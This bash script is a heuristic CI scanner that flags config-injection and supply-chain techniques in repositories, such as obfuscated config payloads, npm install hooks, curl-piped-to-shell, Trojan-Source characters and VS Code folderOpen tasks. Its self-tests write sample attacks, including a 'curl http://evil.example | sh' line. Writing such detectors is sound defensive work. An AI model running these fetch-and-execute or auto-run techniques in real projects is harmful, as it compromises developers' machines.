#!/usr/bin/env bash
#
# check-config-payloads-public.sh — public-safe config-payload preflight.
#
# A heuristics-only variant of the Fort Knox preflight, safe to vendor into a
# PUBLIC repo: it detects config-injection / supply-chain *techniques* using
# generic patterns and carries **no IOC signature database** — so it never
# publishes our detection fingerprints. Pairs with a repo-local workflow
# (templates/scripts/security/fortknox-public-preflight.yml). For private repos,
# use the full check-executable-config-payloads.sh (scanner + signatures).
#
# No execution: bash/find/grep only, run as the first CI step after checkout.
# Detects, in executable config (*.config.*, next/postcss/tailwind/vite/eslint/
# svelte configs, .vscode/*) and repo-wide:
#   FAIL  repo-root .mcp.json / .cursor/mcp.json (prohibited auto-load surface)
#   FAIL  .vscode/tasks.json runOn:folderOpen (auto-executes on open)
#   FAIL  config-injection obfuscation combo (String.fromCharCode + global[...]=)
#   WARN  eval( / new Function( in executable config
#   WARN  createRequire / const-require bridge in executable config
#   WARN  base64-like blob (>=200 chars) in executable config
#   WARN  package.json lifecycle hooks (preinstall/install/postinstall/prepare/...)
#   WARN  curl piped to shell, repo-wide
#   WARN  Trojan-Source bidirectional-override characters
#
# Usage: check-config-payloads-public.sh [--strict] [ROOT]   (default ROOT=.)
#        check-config-payloads-public.sh --self-test
# Exit: 0 = PASS or WARN; 1 = FAIL (or WARN under --strict).
# Last line: FORTKNOX_PREFLIGHT_VERDICT=PASS|WARN|FAIL
#
# LIMITATIONS — a heuristic speed bump, NOT a proof of safety. It is grep-based and can
# be evaded by a determined attacker (string concatenation, computed keys, alternate
# encodings, novel entrypoints). A green PASS means "no known technique from this family
# was spotted," NOT "this config is safe." The real controls are required review, signed
# commits, force-push protection, and least-privilege CI; this gate exists to catch the
# known incident technique + careless mistakes and to make deliberate cases noisier.
#
set -euo pipefail
LC_ALL=C
export LC_ALL

FAILS=0; WARNS=0; STRICT=0
fail() { echo "::error file=$1,line=$2::FORTKNOX: $3"; FAILS=$((FAILS+1)); }
warn() { echo "::warning file=$1,line=$2::FORTKNOX: $3"; WARNS=$((WARNS+1)); }

# We scan symlinked configs / tasks.json (-type l) because a config symlinked at an in-repo
# payload is a real evasion. But NEVER read the target unless it resolves to a REGULAR FILE
# INSIDE the repo: a symlink to a device (/dev/zero, /dev/urandom → infinite read → hang), a
# directory, a cycle, or a path outside the root is itself suspicious → WARN and skip, don't
# follow. Returns 0 = safe to scan; 1 = handled (warned), caller must `continue`.
symlink_safe_or_warn() { # $1=path
  local f="$1" tgt
  [ -L "$f" ] || return 0
  tgt=$(readlink -f -- "$f" 2>/dev/null || true)
  if [ -z "$tgt" ] || [ ! -f "$tgt" ]; then
    warn "$f" 1 "symlinked config/task target is missing, a device, a directory, or a cycle — not followed (evasion/DoS guard), review"
    return 1
  fi
  case "$tgt" in
    "$ROOT_ABS"/*|"$ROOT_ABS") return 0 ;;
    *) warn "$f" 1 "symlinked config/task resolves OUTSIDE the repo root — not followed, review"; return 1 ;;
  esac
}

# _symlink_target_if_safe / scan_files — DoS-safe batch grep that ALSO follows -type l symlinks that
# resolve to an in-repo REGULAR file (never a device/outside path). Closes the -type f asymmetry on
# the batch content finds so a symlinked payload no longer evades; mirrors the canonical scanner.
_symlink_target_if_safe() {
  local f="$1" tgt
  tgt=$(readlink -f -- "$f" 2>/dev/null) || return 1
  [ -f "$tgt" ] || return 1
  case "$tgt" in "$ROOT_ABS"/*|"$ROOT_ABS") printf '%s' "$tgt"; return 0 ;; *) return 1 ;; esac
}
scan_files() {  # $1=root ; rest=grep args. Excludes the scanner's own source (self-match guard).
  local root="$1"; shift
  find "$root" \( -name .git -o -name node_modules \) -prune -o -type f ! -name 'check-config-payloads-public.sh' \
    -exec grep "$@" -- {} + 2>/dev/null || true
  local l tgt
  while IFS= read -r -d '' l; do
    case "$l" in */check-config-payloads-public.sh) continue ;; esac
    tgt=$(_symlink_target_if_safe "$l") || continue
    grep "$@" -- "$tgt" 2>/dev/null | sed "s#^${tgt}:#${l}:#" || true
  done < <(find "$root" \( -name .git -o -name node_modules \) -prune -o -type l -print0 2>/dev/null)
}

# Bidi Trojan-Source overrides: U+202A-E (E2 80 AA-AE), U+2066-9 (E2 81 A6-A9).
# Match full UTF-8 byte sequences, not a byte-range bracket — under LC_ALL=C a
# bracket range matches the E2 lead byte alone and false-positives on em dashes.
BIDI_RE=$'\xe2\x80[\xaa-\xae]|\xe2\x81[\xa6-\xa9]'

# Executable-config surface (where an injected payload hides + auto-runs).
config_files() {  # $1 = root ; prints NUL-separated paths
  find "$1" \( -name .git -o -name node_modules -o -name dist -o -name build \
      -o -name .next -o -name coverage -o -name target \) -prune -o \
    \( -name '*.config.js' -o -name '*.config.cjs' -o -name '*.config.mjs' \
       -o -name '*.config.ts' -o -name '*.config.mts' -o -name '*.config.cts' \
       -o -name 'next.config.*' -o -name 'postcss.config.*' \
       -o -name 'tailwind.config.*' -o -name 'vite.config.*' -o -name 'svelte.config.*' \
       -o -name '.eslintrc*' -o -name 'rollup.config.*' -o -name 'webpack.config.*' \) \
    \( -type f -o -type l \) -print0 2>/dev/null
}

scan() {
  local root="${1:-.}" f l hits
  echo "FORTKNOX public preflight: scanning $root (heuristics only, no signatures)"
  ROOT_ABS=$(cd "$root" 2>/dev/null && pwd -P)   # canonical root for the symlink-target in-root check

  # ---- executable-config heuristics ----
  while IFS= read -r -d '' f; do
    symlink_safe_or_warn "$f" || continue   # -type l: only follow an in-repo regular-file target
    # config-injection obfuscation combo -> FAIL (fromCharCode join + global assign)
    if grep -qE 'String\.fromCharCode' -- "$f" 2>/dev/null && grep -qE '(^|[^A-Za-z0-9_$.])global(This)?[[:space:]]*\[[^]]+\][[:space:]]*=([^=]|$)' -- "$f" 2>/dev/null; then
      l=$(grep -nE '(^|[^A-Za-z0-9_$.])global(This)?[[:space:]]*\[[^]]+\][[:space:]]*=([^=]|$)' -- "$f" | head -1 | cut -d: -f1)
      fail "$f" "${l:-1}" "config-injection obfuscation (String.fromCharCode + global[...]= reconstruction) — the runtime-deobfuscation payload family"
    fi
    hits=$(grep -nHE 'createRequire|(const|let|var)[[:space:]]+require[[:space:]]*=' -- "$f" 2>/dev/null || true)
    [ -n "$hits" ] && while IFS= read -r h; do warn "$f" "$(echo "$h"|cut -d: -f1)" "createRequire / const-require bridge in executable config"; done <<<"$hits"
    hits=$(grep -nHE 'eval[[:space:]]*\(|new[[:space:]]+Function[[:space:]]*\(' -- "$f" 2>/dev/null || true)
    [ -n "$hits" ] && while IFS= read -r h; do warn "$f" "$(echo "$h"|cut -d: -f1)" "eval( / new Function( in executable config"; done <<<"$hits"
    hits=$(grep -nHE '[A-Za-z0-9+/=]{200,}' -- "$f" 2>/dev/null || true)
    [ -n "$hits" ] && warn "$f" "$(echo "$hits"|head -1|cut -d: -f1)" "base64-like blob (>=200 chars) in executable config"
  done < <(config_files "$root")

  # ---- package.json lifecycle hooks ----
  while IFS= read -r -d '' f; do
    symlink_safe_or_warn "$f" || continue   # -type l: only follow an in-repo regular-file target
    hits=$(grep -nHE '"(preinstall|install|postinstall|prepare|prepublish|prepublishOnly)"[[:space:]]*:' -- "$f" 2>/dev/null || true)
    [ -n "$hits" ] && warn "$f" "$(echo "$hits"|head -1|cut -d: -f1)" "package.json lifecycle hook (runs on npm install) — review it"
  done < <(find "$root" \( -name node_modules -o -name .git \) -prune -o \( -type f -o -type l \) -name 'package.json' -print0 2>/dev/null)

  # ---- repo-wide: curl|sh, bidi ----
  # exclude the scanner's own source so its detector patterns don't self-match
  hits=$(scan_files "$root" -nHIE 'curl[^|;&]*\|[[:space:]]*(sudo[[:space:]]+)?(ba|z)?sh')
  [ -n "$hits" ] && while IFS= read -r h; do warn "$(echo "$h"|cut -d: -f1)" "$(echo "$h"|cut -d: -f2)" "curl piped to shell — fetch-and-execute, needs review"; done <<<"$hits"
  # Per-hit warns with the REAL file+line (mirrors the curl|sh loop). Was: first
  # hit only with line hardcoded to 1 — the annotation pointed nowhere (aven-landing
  # field report 2026-08: operators can't clear a warning they can't locate).
  hits=$(scan_files "$root" -nHIE "$BIDI_RE")
  [ -n "$hits" ] && while IFS= read -r h; do warn "$(echo "$h"|cut -d: -f1)" "$(echo "$h"|cut -d: -f2)" "Trojan-Source bidirectional-override character"; done <<<"$hits"

  # ---- prohibited surfaces -> FAIL ----
  [ -f "$root/.mcp.json" ] && fail "$root/.mcp.json" 1 "repo-root .mcp.json — prohibited auto-loaded MCP surface"
  [ -f "$root/.cursor/mcp.json" ] && fail "$root/.cursor/mcp.json" 1 "repo-root .cursor/mcp.json — prohibited auto-loaded MCP surface"
  while IFS= read -r -d '' f; do
    symlink_safe_or_warn "$f" || continue   # -type l: only follow an in-repo regular-file target
    # Strip whitespace so a formatter splitting "runOn": across lines can't dodge it;
    # also flag any ESCAPED runOn value ("folderOpen") — a legit runOn value
    # ("folderOpen"/"default") never needs a backslash escape.
    # JSONC: strip FULL-LINE // comments first (bypass-safe — an active line is never a
    # full-line comment) so a commented example does not false-fail; then collapse whitespace.
    st=$(grep -vE '^[[:space:]]*//' -- "$f" 2>/dev/null | tr -d '[:space:]' || true)
    if printf '%s' "$st" | grep -qE '"runOn":"?folderOpen' \
       || printf '%s' "$st" | grep -qE '"runOn":"[^"]*\\'; then
      l=$(grep -nE 'runOn|folderOpen' -- "$f" | grep -vE '^[0-9]+:[[:space:]]*//' | head -1 | cut -d: -f1)
      fail "$f" "${l:-1}" "editor task auto-runs on folderOpen (or an escaped runOn value) — executes on open"
    fi
  done < <(find "$root" -path '*/.vscode/tasks.json' \( -type f -o -type l \) -print0 2>/dev/null)
}

verdict() {
  echo "FORTKNOX public preflight summary: fails=$FAILS warns=$WARNS strict=$STRICT"
  if [ "$FAILS" -gt 0 ] || { [ "$STRICT" -eq 1 ] && [ "$WARNS" -gt 0 ]; }; then
    echo "FORTKNOX_PREFLIGHT_VERDICT=FAIL"; return 1
  elif [ "$WARNS" -gt 0 ]; then echo "FORTKNOX_PREFLIGHT_VERDICT=WARN"
  else echo "FORTKNOX_PREFLIGHT_VERDICT=PASS"; fi
  return 0
}

self_test() {
  local t; t=$(mktemp -d); local rc=0
  # benign config -> PASS
  mkdir -p "$t/ok"; printf 'export default { theme: {} }\n' > "$t/ok/postcss.config.js"
  ( FAILS=0; WARNS=0; scan "$t/ok" >/dev/null; verdict >/dev/null ) && echo "SELFTEST PASS: benign config" || { echo "SELFTEST FAIL: benign config"; rc=1; }
  # obfuscation combo -> FAIL
  mkdir -p "$t/evil"; printf 'module.exports={};\nglobal["!"]=require;String.fromCharCode(127);\n' > "$t/evil/next.config.js"
  ( FAILS=0; WARNS=0; scan "$t/evil" >/dev/null; verdict >/dev/null ) && { echo "SELFTEST FAIL: obfuscation not caught"; rc=1; } || echo "SELFTEST PASS: obfuscation combo FAILs"
  # repo-root .mcp.json -> FAIL
  mkdir -p "$t/mcp"; printf '{}' > "$t/mcp/.mcp.json"
  ( FAILS=0; WARNS=0; scan "$t/mcp" >/dev/null; verdict >/dev/null ) && { echo "SELFTEST FAIL: .mcp.json not caught"; rc=1; } || echo "SELFTEST PASS: repo-root .mcp.json FAILs"
  # folderOpen task -> FAIL
  mkdir -p "$t/vs/.vscode"; printf '{"tasks":[{"runOn":"folderOpen"}]}' > "$t/vs/.vscode/tasks.json"
  ( FAILS=0; WARNS=0; scan "$t/vs" >/dev/null; verdict >/dev/null ) && { echo "SELFTEST FAIL: folderOpen not caught"; rc=1; } || echo "SELFTEST PASS: folderOpen task FAILs"
  # benign global-suffix identifier -> PASS (must not false-FAIL)
  mkdir -p "$t/ok2"; printf 'const myglobal={};myglobal["x"]=1;String.fromCharCode(65);\n' > "$t/ok2/vite.config.js"
  ( FAILS=0; WARNS=0; scan "$t/ok2" >/dev/null; verdict >/dev/null ) && echo "SELFTEST PASS: benign global-suffix var not flagged" || { echo "SELFTEST FAIL: benign global-suffix var flagged"; rc=1; }
  # escaped folderOpen -> FAIL
  mkdir -p "$t/vs2/.vscode"; printf '{"tasks":[{"runOn":"folder\\u004fpen"}]}' > "$t/vs2/.vscode/tasks.json"
  ( FAILS=0; WARNS=0; scan "$t/vs2" >/dev/null; verdict >/dev/null ) && { echo "SELFTEST FAIL: escaped folderOpen not caught"; rc=1; } || echo "SELFTEST PASS: escaped folderOpen FAILs"
  # JSONC full-line commented folderOpen -> PASS (Nate OPEN: was a false-FAIL)
  mkdir -p "$t/jsonc/.vscode"; printf '{\n  // "runOn":"folderOpen" example\n  "tasks": []\n}\n' > "$t/jsonc/.vscode/tasks.json"
  ( FAILS=0; WARNS=0; scan "$t/jsonc" >/dev/null; verdict >/dev/null ) && echo "SELFTEST PASS: JSONC commented folderOpen not flagged" || { echo "SELFTEST FAIL: JSONC commented folderOpen flagged"; rc=1; }
  # global comparison (===) with fromCharCode present -> PASS (Nate OPEN: not a real assignment)
  mkdir -p "$t/cmp"; printf 'String.fromCharCode(65);if(globalThis["Buffer"]===Buffer){}\n' > "$t/cmp/vite.config.js"
  ( FAILS=0; WARNS=0; scan "$t/cmp" >/dev/null; verdict >/dev/null ) && echo "SELFTEST PASS: global === comparison not flagged" || { echo "SELFTEST FAIL: global === comparison flagged"; rc=1; }
  # symlinked tasks.json -> active folderOpen -> FAIL (Nate OPEN: -type l)
  mkdir -p "$t/sym/.vscode"; printf '{"tasks":[{"runOn":"folderOpen"}]}' > "$t/sym/evil.json"; ln -sf ../evil.json "$t/sym/.vscode/tasks.json"
  ( FAILS=0; WARNS=0; scan "$t/sym" >/dev/null; verdict >/dev/null ) && { echo "SELFTEST FAIL: symlinked tasks.json not caught"; rc=1; } || echo "SELFTEST PASS: symlinked tasks.json folderOpen FAILs"
  # --- symlink-DoS guard regressions (the -type l change could follow a symlink to a device -> infinite read) ---
  _to=$(command -v timeout || command -v gtimeout || true)
  mkdir -p "$t/dos/.vscode"; ln -sf /dev/urandom "$t/dos/.vscode/tasks.json"
  _o=$(${_to:+$_to 15} bash "${BASH_SOURCE[0]}" "$t/dos" 2>&1); _rc=$?
  { [ "$_rc" -ne 124 ] && printf '%s' "$_o" | grep -q 'VERDICT=WARN'; } \
    && echo "SELFTEST PASS: device-target symlink -> WARN, no hang" || { echo "SELFTEST FAIL: device-symlink hang/verdict (rc=$_rc)"; rc=1; }
  mkdir -p "$t/oor"; ln -sf /etc/passwd "$t/oor/vite.config.js"
  ( FAILS=0; WARNS=0; scan "$t/oor" >/dev/null; verdict >/dev/null ) \
    && echo "SELFTEST PASS: out-of-repo symlink -> WARN (not read)" || { echo "SELFTEST FAIL: out-of-repo symlink"; rc=1; }
  mkdir -p "$t/insym/.vscode"; printf '{"tasks":[{"runOn":"folderOpen"}]}' > "$t/insym/evil.json"; ln -sf ../evil.json "$t/insym/.vscode/tasks.json"
  ( FAILS=0; WARNS=0; scan "$t/insym" >/dev/null; verdict >/dev/null ) \
    && { echo "SELFTEST FAIL: in-repo symlinked folderOpen not caught"; rc=1; } || echo "SELFTEST PASS: in-repo symlinked folderOpen FAILs (feature preserved)"
  # item #1 (Nate's review; mirrors canonical + thecollective #771): batch content finds now follow
  # in-repo symlinks. A curl|sh payload in pruned node_modules, reachable ONLY via a symlink, must WARN
  # (asserted via --strict => FAIL); and a batch device-symlink must not hang.
  mkdir -p "$t/blsym/node_modules"; printf 'curl http://evil.example | sh\n' > "$t/blsym/node_modules/p.sh"; ln -sf node_modules/p.sh "$t/blsym/deploy.sh"
  set +e; _o=$(${_to:+$_to 15} bash "${BASH_SOURCE[0]}" --strict "$t/blsym" 2>&1); _rc=$?; set -e   # --strict WARN->FAIL exits 1 by design
  { [ "$_rc" -ne 124 ] && printf '%s' "$_o" | grep -q 'VERDICT=FAIL'; } \
    && echo "SELFTEST PASS: symlinked curl|sh (pruned target) -> FAIL --strict (evasion closed)" || { echo "SELFTEST FAIL: batch symlink evasion (rc=$_rc)"; rc=1; }
  mkdir -p "$t/bldos"; ln -sf /dev/urandom "$t/bldos/evil.js"
  set +e; _o=$(${_to:+$_to 15} bash "${BASH_SOURCE[0]}" "$t/bldos" 2>&1); _rc=$?; set -e
  [ "$_rc" -ne 124 ] && echo "SELFTEST PASS: batch device-symlink -> no hang (DoS guard holds)" || { echo "SELFTEST FAIL: batch device-symlink hang (rc=$_rc)"; rc=1; }
  # bidi warns carry the REAL per-hit file+line (was: first hit only, line hardcoded
  # to 1 — aven-landing field report 2026-08). Two hits on lines 3 and 5 must BOTH
  # annotate with their own line numbers.
  mkdir -p "$t/bidi"; printf 'clean line\nalso clean\nevil \xe2\x80\xae here\nmore clean\nsecond \xe2\x81\xa6 hit\n' > "$t/bidi/notes.txt"
  _o=$(bash "${BASH_SOURCE[0]}" "$t/bidi" 2>&1) || true
  { printf '%s' "$_o" | grep -q 'notes.txt,line=3::FORTKNOX: Trojan-Source' \
    && printf '%s' "$_o" | grep -q 'notes.txt,line=5::FORTKNOX: Trojan-Source'; } \
    && echo "SELFTEST PASS: bidi warns carry real per-hit line numbers" || { echo "SELFTEST FAIL: bidi per-hit line numbers"; rc=1; }
  rm -rf "$t"
  [ "$rc" -eq 0 ] && echo "FORTKNOX_PUBLIC_PREFLIGHT_SELFTEST=PASS" || echo "FORTKNOX_PUBLIC_PREFLIGHT_SELFTEST=FAIL"
  exit "$rc"
}

# ---- main ----
case "${1:-}" in
  --self-test) self_test ;;
esac
ROOT="."
for a in "$@"; do case "$a" in --strict) STRICT=1 ;; -*) ;; *) ROOT="$a" ;; esac; done
scan "$ROOT"
verdict
